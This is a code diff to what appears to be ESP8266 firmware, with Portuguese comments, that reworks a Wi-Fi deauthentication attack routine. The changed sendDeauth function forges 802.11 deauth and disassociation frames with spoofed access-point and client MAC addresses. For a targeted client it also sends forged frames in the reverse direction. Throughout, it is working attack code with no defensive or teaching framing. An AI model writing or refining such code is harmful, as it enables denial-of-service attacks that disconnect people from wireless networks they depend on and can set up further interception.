@@ -34,7 +34,7 @@ void initDeauther()
 {
   wifi_set_opmode(STATION_MODE);
   wifi_promiscuous_enable(1);
-  Serial.println("Deauther initialized with promiscuous mode");
+  Serial.println("Deauther initialized with STATION_MODE and promiscuous mode");
 }
 
 uint8_t *parseMac(String macStr)
@@ -47,38 +47,42 @@ uint8_t *parseMac(String macStr)
 void sendDeauth(uint8_t *apMac, uint8_t *clientMac, uint8_t channel, uint8_t reason = 7)
 {
   // MUITO IMPORTANTE: Mudar para o canal do alvo
-  if (WiFi.channel() != channel)
-  {
-    wifi_set_channel(channel);
-    Serial.print("Changed to channel ");
-    Serial.println(channel);
-  }
+  wifi_set_channel(channel);
+  delay(10); // Pequeno delay para estabilizar
+  Serial.print("Changed to channel ");
+  Serial.println(channel);
 
-  // Deauth para o cliente
+  Serial.println("Sending deauth packets");
+
+  // Deauth from AP to client
+  deauthPacket[0] = 0xC0;
   memcpy(&deauthPacket[4], clientMac, 6); // Receiver = Cliente
   memcpy(&deauthPacket[10], apMac, 6);    // Transmitter = AP
   memcpy(&deauthPacket[16], apMac, 6);    // BSSID = AP
   deauthPacket[24] = reason;
 
-  Serial.println("Sending deauth packets");
+  wifi_send_pkt_freedom(deauthPacket, 26, 0);
 
-  // Envia rajada de deauth
-  for (int i = 0; i < 5; i++)
-  {
+  // Disassociation from AP to client
+  deauthPacket[0] = 0xA0;
+  wifi_send_pkt_freedom(deauthPacket, 26, 0);
+
+  // If not broadcast, send from client to AP
+  if (memcmp(clientMac, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0) {
+    memcpy(&deauthPacket[4], apMac, 6);   // Receiver = AP
+    memcpy(&deauthPacket[10], clientMac, 6); // Transmitter = Client
+    memcpy(&deauthPacket[16], apMac, 6); // BSSID = AP
+
+    deauthPacket[0] = 0xC0;
     wifi_send_pkt_freedom(deauthPacket, 26, 0);
-    delayMicroseconds(200);
+
+    deauthPacket[0] = 0xA0;
+    wifi_send_pkt_freedom(deauthPacket, 26, 0);
   }
 
-  // Disassociation (muitas vezes mais efetivo)
-  deauthPacket[0] = 0xA0; // muda para disassociation
-  for (int i = 0; i < 5; i++)
-  {
-    wifi_send_pkt_freedom(deauthPacket, 26, 0);
-    delayMicroseconds(200);
-  }
-
-  deauthPacket[0] = 0xC0; // volta para deauth
-  deautherPacketsSent += 10;
+  deautherPacketsSent += memcmp(clientMac, "\xFF\xFF\xFF\xFF\xFF\xFF", 6) != 0 ? 4 : 2;
+  Serial.print("Packets sent so far: ");
+  Serial.println(deautherPacketsSent);
 }
 
 void startDeauthAttack(uint8_t *apMac, uint8_t *clientMac, uint8_t channel, uint8_t reason)
@@ -126,6 +130,12 @@ void toggleDeauther()
   {
     uint8_t *apMac = parseMac(deautherApMac);
     uint8_t *clientMac = parseMac(deautherClientMac);
+    Serial.print("Starting deauther with AP MAC: ");
+    Serial.print(deautherApMac);
+    Serial.print(", Client MAC: ");
+    Serial.print(deautherClientMac);
+    Serial.print(", Channel: ");
+    Serial.println(deautherChannel);
     startDeauthAttack(apMac, clientMac, deautherChannel, 7);
     Serial.println("Deauther started");
   }
